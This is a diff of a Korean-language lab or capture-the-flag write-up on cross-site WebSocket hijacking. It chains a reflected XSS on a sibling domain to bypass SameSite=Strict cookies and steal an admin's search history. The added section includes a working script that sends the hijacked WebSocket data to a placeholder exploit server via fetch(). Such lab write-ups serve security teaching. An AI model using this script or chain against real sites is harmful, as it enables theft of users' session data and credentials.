@@ -10,25 +10,40 @@ To adopt kitties ₍^. .^₎⟆
 <br>
 
 ## 문제 풀이 시나리오
-### 1. HTTP history를 통해 WebSocket 확인
-- 페이지를 새로고침하면 WebSocket 연결이 자동으로 생성
-- 클라이언트가 "READY" 메시지를 서버에 전송
-- 서버는 전체 검색 기록으로 응답
-### 2. CSWSH 페이로드
-- WebSocket 주소 확인하고 스크립트로 연결 시도
-- WebSocket 연결 후 "READY"를 보내고 서버 응답을 fetch()로 공격자 서버로 전송
-- 공격자가 응답을 받을 수 있도록 no-cors 모드로 POST 요청
-- 이 시점에서는 세션 쿠키가 없어 응답이 오지 않
-### 3. 세션 쿠키의 Same Site attribute가 Strict여서 공격 안되는 것 확인 
-- 개발자 도구 > Application 탭 > 쿠키를 통해 확인 가능
-- 다른 도메인에서 요청 시 세션 쿠키가 브라우저에 전송되지 않음 
-### 4. 취약점이 있는 sibling domain 확인
-- Access-Control-Allow-Origin 을 통해 sibling domain 있는 것 확인 
-- username 파라미터가 응답에 반영되는 reflected XSS
-- GET 기반 XSS로 스크립트 전송 가능
+### 1. 검색 기능 분석
+- 무언가를 검색하면 검색 기록도 반환됨
+- 검색 기록은 유저 아이디에 따라 반환
+- 개발자 툴을 통해 살펴보면 웹 소켓 핸드셰이크를 찾을 수 있음
+- 요청에 예측 불가능한 토큰이 없기 때문에 CSWSH 취약점의 가능성 확인 가능
+- 페이지 새로고침 시 클라이언트가 READY 메시지를 서버에 보내고 서버는 검색 기록으로 응답
+### 2. CSWSH 취약점 확인
+- search.js에서 코드 확인하고
+- 공격 스크립트 작성해 익스플로잇 서버 통해 보내기
+- 스크립트 실행 시 새 웹소켓 연결이 생성되고 검색 기록이 유출됨
+    <script>
+        let newWebSocket = new WebSocket("ws://localhost:5000/search");
+        newWebSocket.onopen = function () {
+            newWebSocket.send("READY");
+        };
+
+        newWebSocket.onmessage = function (event) {
+        var message = event.data;
+        fetch(
+            "{익스플로잇서버주소}message?=" + btoa(message) //base64인코딩
+        );
+        };
+    </script>
+- 하지만 세션 쿠키가 포함되지 않기 때문에 새 세션의 검색 기록만 얻을 수 있음
+- 확인해보면 서버가 SameSite=Strict이기 때문에 크로스사이트 요청에 쿠키를 보내지 않음을 확인할 수 있음
+### 3. sibling domain에서 추가 취약점 발견
+- Access-Control-Allow-Origin 을 통해 sibling domain 있는 것 확인
+- 해당 페이지에 접속해보면 로그인 폼을 확인할 수 있음
+- username 파라미터가 응답에 반영되는 reflected XSS 취약점이 있는 것을 확인할 수 있음
+- POST 요청을 GET으로 변환해도 XSS가 동작하여 URL로 직접 공격 코드 삽입 가능
+- sibling 도메인이 같은 사이트로 간주되어 SameSite 쿠키 제한 우회에 이용 가능
 ### 5. sibling domain을 통해 SameSite restriction 우회
 - 기존 CSWSH 스크립트를 URL 인코딩하여 username 파라미터에 삽입
-- XSS가 실행되면 같은 사이트의 WebSocket 연결이므로 세션 쿠키 포함됨
-- WebSocket 연결 → "READY" 전송 → 전체 히스토리 응답 → 공격자 서버로 유출
+- 익스플로잇 서버에 그 url로 리다이렉트하는 스크립트 생성
+    => 전체 검색 기록이 유출됨
 ### 6. 전송된 메시지 분석해서 admin 정보 획득
 - 로그인 하면 성공
